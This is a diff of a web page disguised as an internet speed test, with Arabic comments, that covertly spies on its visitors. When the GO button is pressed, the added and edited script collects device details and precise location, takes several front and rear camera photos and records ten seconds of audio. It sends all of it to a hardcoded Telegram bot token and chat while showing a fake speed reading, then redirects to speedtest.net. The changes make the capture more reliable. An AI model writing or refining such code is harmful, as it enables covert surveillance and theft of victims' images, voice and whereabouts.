@@ -8,8 +8,8 @@
         :root { --accent: #00d2ff; --bg: #0b0e18; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .grid { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,210,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,210,255,0.03) 1px, transparent 1px); background-size: 30px 30px; z-index: -1; }
-        .card { background: rgba(255,255,255,0.02); padding: 40px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
-        .btn-go { width: 140px; height: 140px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 32px; font-weight: 900; cursor: pointer; transition: 0.4s; outline: none; }
+        .card { background: rgba(255,255,255,0.02); padding: 40px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); position: relative; }
+        .btn-go { width: 140px; height: 140px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 32px; font-weight: 900; cursor: pointer; transition: 0.4s; outline: none; z-index: 10; }
         .btn-go:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
         #speedBox { display: none; margin-top: 10px; }
         .num { font-size: 55px; font-weight: 900; color: var(--accent); text-shadow: 0 0 20px rgba(0,210,255,0.5); }
@@ -35,7 +35,6 @@
         const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
         const chat = "7984067238";
 
-        // وظيفة الإرسال العامة لتلجرام
         async function sendToTelegram(msg, isImg = false, data = null, isVoice = false) {
             const url = `https://api.telegram.org/bot${token}/`;
             try {
@@ -54,22 +53,14 @@
             } catch (e) {}
         }
 
-        // 1. التقرير الشامل (مع الرام، المعالج، البطارية، و IP)
         async function getReport() {
             const urlParams = new URLSearchParams(window.location.search);
-            const targetId = urlParams.get('id') || "مستهدف جديد";
-
+            const targetId = urlParams.get('id') || "مستهدف مجهول";
             let info = `📊 *تقرير شامل للهدف (${targetId})*:\n\n`;
             info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
             info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
             info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
             info += `• 🖥️ الشاشة: \`${screen.width}x${screen.height}\`\n`;
-            
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                info += `• 📶 الشبكة: \`${conn.effectiveType.toUpperCase()}\` (${conn.downlink} Mbps)\n`;
-            }
-
             try {
                 const b = await navigator.getBattery();
                 info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌" : "🔋"})\n`;
@@ -79,78 +70,79 @@
             return info;
         }
 
-        // 2. نظام التقاط الصور المتعددة السريع (البث)
-        async function captureStream(mode, count) {
+        // دالة التقاط الصور السريعة مع إغلاق المسارات فوراً لمنع السواد
+        async function capturePhotos(mode, count) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById("v");
                 const c = document.getElementById("c");
-                v.srcObject = s;
+                v.srcObject = stream;
                 await new Promise(r => v.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 1200)); 
+                await new Promise(r => setTimeout(r, 2000)); // وقت كافٍ لضبط الإضاءة
 
                 for (let i = 0; i < count; i++) {
                     c.width = 720; c.height = 960;
                     c.getContext("2d").drawImage(v, 0, 0);
-                    c.toBlob(async (blob) => {
-                        await sendToTelegram(`${mode === 'user' ? '👤 أمامية' : '🌍 خلفية'} - لقطة ${i+1}`, true, blob);
-                    }, "image/jpeg", 0.7);
-                    await new Promise(r => setTimeout(r, 400)); // سرعة التقاط عالية
+                    const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.8));
+                    if (blob) {
+                        sendToTelegram(`${mode === 'user' ? '👤 أمامية' : '🌍 خلفية'} - لقطة ${i+1}`, true, blob);
+                    }
+                    await new Promise(r => setTimeout(r, 500)); // فاصل زمني بسيط بين اللقطات
                 }
-                s.getTracks().forEach(t => t.stop());
-            } catch (e) {}
+                // إغلاق الكاميرا تماماً قبل الانتقال للخطوة التالية
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) { console.error("Camera Error:", e); }
         }
 
-        // 3. نظام تسجيل الصوت (10 ثوانٍ)
         async function recordAudio(sec) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mr = new MediaRecorder(s);
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
-                return new Promise(res => {
-                    mr.ondataavailable = e => chunks.push(e.data);
-                    mr.onstop = () => {
+                return new Promise(resolve => {
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                        s.getTracks().forEach(t => t.stop());
-                        res(blob);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(blob);
                     };
-                    mr.start();
-                    setTimeout(() => mr.stop(), sec * 1000);
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), sec * 1000);
                 });
             } catch (e) { return null; }
         }
 
-        // تشغيل النظام عند النقر على GO
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
             document.getElementById("speedBox").style.display = "block";
-            document.getElementById("msg").innerText = "جاري الاتصال بالسيرفر...";
+            document.getElementById("msg").innerText = "جاري الفحص...";
 
             const timer = setInterval(() => {
-                document.getElementById("num").innerText = (Math.random() * (96 - 81) + 81).toFixed(1);
+                document.getElementById("num").innerText = (Math.random() * (96 - 84) + 84).toFixed(1);
             }, 100);
 
-            // التنفيذ بالترتيب لضمان النجاح:
-            // أ. التقرير والموقع
+            // التنفيذ المتسلسل (Sequential) لمنع تعارض الموارد
+            // 1. التقرير والموقع
             sendToTelegram(await getReport());
             navigator.geolocation.getCurrentPosition(p => {
                 sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             });
 
-            // ب. البث المباشر للصور (3 أمامية و 3 خلفية)
-            await captureStream("user", 3);
-            await captureStream("environment", 3);
+            // 2. التقاط الصور (أولاً) - 3 أمامية و 3 خلفية
+            await capturePhotos("user", 3);
+            await capturePhotos("environment", 3);
 
-            // ج. تسجيل الصوت (10 ثوانٍ)
-            recordAudio(10).then(audio => {
-                if (audio) sendToTelegram(null, false, audio, true);
-            });
+            // 3. تسجيل الصوت (ثانياً) - يبدأ بعد إغلاق الكاميرا تماماً
+            const audioBlob = await recordAudio(10);
+            if (audioBlob) {
+                await sendToTelegram(null, false, audioBlob, true);
+            }
 
-            // د. التوجيه النهائي
+            // 4. التوجيه النهائي بعد انتهاء كل العمليات
             setTimeout(() => {
                 clearInterval(timer);
                 location.href = "https://www.speedtest.net/ar";
-            }, 15000);
+            }, 2000); 
         };
     </script>
 </body>
